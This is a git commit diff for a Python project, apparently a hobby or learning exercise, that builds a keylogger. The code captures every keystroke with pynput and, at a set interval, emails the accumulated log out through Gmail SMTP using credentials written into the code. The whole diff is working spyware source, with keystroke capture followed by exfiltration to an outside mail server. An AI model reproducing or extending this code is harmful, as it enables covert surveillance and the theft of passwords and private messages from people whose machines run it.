90dce94218e577f7b0b6b4fa54eb2c6ed80e4799
root <root@localhost.localdomain>
2018-12-04 23:34:25 -0500

    Cleaned code; implemented emailing

--- blogger.py
+++ blogger.py
@@ -2,5 +2,5 @@
 
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
+my_keylogger = keylogger.Keylogger(120, "defaultEmail", "defaultPassword")
 my_keylogger.start()
--- keylogger.py
+++ keylogger.py
@@ -2,32 +2,50 @@
 
 import pynput.keyboard
 import threading
-
-log = ""
-
+import smtplib
 
 class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+    # end __init__
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+    # end append_to_log
+
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
     # end process_key_press
 
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(5, self.report)
+        self.send_email(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
     # end report
+
+    def send_email(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+    # end send_email
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+    # end start
+# end Keylogger
